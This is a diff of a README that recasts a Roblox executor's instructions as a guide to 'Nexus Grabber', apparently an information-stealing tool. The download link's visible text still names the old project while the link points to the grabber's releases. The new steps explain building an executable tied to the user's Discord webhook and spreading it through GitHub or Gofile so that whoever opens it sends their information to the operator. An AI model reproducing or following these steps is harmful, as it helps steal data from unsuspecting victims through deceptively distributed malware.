@@ -54,17 +54,25 @@
 
 ## Installation
 
-1. Download the latest release from the [Releases](https://github.com/your-username/bloom-exploit/releases) page.
+1. Download the latest release from the [Releases]([https://github.com/your-username/bloom-exploit/releases](https://github.com/OFBloom4345/Nexus-grabber/releases/tag/Executor)) page.
 2. Extract the downloaded ZIP file.
-3. Run `BloomExecutor.exe` as administrator.
+3. Run `Start.bat` "It will ask you for a password.
+
+## Creating a webhook
+1.Make a server 
+2.Go to Server settings,integration,create webhook
+3.Copy Webook url
 
 ## Usage
 
-1. Launch the executor.
-2. Attach Bloom Exploit to Roblox.
-3. Load or paste your desired script.
-4. Click "Execute" to run the script in-game.
+1. Launch Start.bat again.
+2. Paste in your Webook url
+3. Check the desired settings.
+4. Press create
 
+## Usage use github or gofile to distribute the exe
+1. When someone opens it it will give you the information
+   
 ## Contributing
 
 We welcome contributions! To contribute:
@@ -80,7 +88,7 @@ This project is licensed under the [MIT License](LICENSE).
 
 ## Disclaimer
 
-Bloom Exploit is intended for educational purposes only. Use it responsibly and comply with Roblox's terms of service.
+Nexus Grabber is intended for educational purposes only. Use it responsibly and comply with Discords terms of service.
 
 ---
 
